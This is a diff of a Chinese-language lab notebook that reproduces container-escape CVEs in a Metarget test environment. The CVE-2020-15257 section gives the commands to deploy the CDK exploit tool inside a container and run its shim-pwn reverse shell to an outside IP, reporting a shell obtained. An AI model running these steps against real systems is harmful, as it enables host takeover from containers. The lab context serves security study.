@@ -36,10 +36,68 @@ SUCCESS -- HOST FILE CHANGED
 
 
 
-2.	cve-2019-13139 命令执行
-3.	cve-2019-14271 容器逃逸
+2.	cve-2019-13139 命令执行（没有）
+
+
+
+
+
+
+
+
+
+
+3.	cve-2019-14271 容器逃逸(没有)
+
+
+
+
+
+
+
+
+
 4.	cve-2020-15257 容器逃逸
+
+
+安装漏洞环境root@VM-8-3-ubuntu:~/metarget# sudo ./metarget cnv install cve-2020-15257
+![image](https://github.com/user-attachments/assets/d1ced1be-4672-4a6a-ae32-0f5e32bc22e5)
+
+查看docker版本，下载ubuntu:18.04
+远程连接到容器内部并查看containerd-shim
+![image](https://github.com/user-attachments/assets/6462fb9a-6a5d-4e15-925d-df9d3663bf78)
+
+下载漏洞利用工具：https://github.com/cdk-team/CDK/releases/tag/v1.0.2
+![image](https://github.com/user-attachments/assets/fb5ec1de-00c9-47eb-8f82-14bb19dd4c08)
+
+使用docker cp目录复制到容器内部
+root@VM-8-3-ubuntu:~/metarget# docker cp cdk_linux_amd64 fbf9212c0fe6:/
+连接到容器
+root@VM-8-3-ubuntu:~/metarget# sudo docker exec -it fbf9212c0fe6 /bin/bash
+给执行权限给该cdk
+root@VM-8-3-ubuntu:/# chmod +x cdk_linux_amd64 
+
+
+使用该工具执行漏洞利用。
+root@VM-8-3-ubuntu:/# ./cdk_linux_amd64 run shim-pwn reverse 43.138.22.133 80  
+（可能存在8888端口安全组没打开的情况）使用80端口，即可
+![image](https://github.com/user-attachments/assets/eb1e8fa1-54d5-4d2c-afdb-894f214a5734)
+
+
+成功获取shell
+![image](https://github.com/user-attachments/assets/3ef7cb7c-c7ca-4ac2-8cf0-5dd0e1a9670a)
+
+
+
+
 5.	cve-2019-5736 容器逃逸
+
+
+
+
+
+
+
 6.	cve-2019-16884 容器逃逸
 7.	cve-2017-1002101 容器逃逸
 8.	cve-2019-11253 拒绝服务
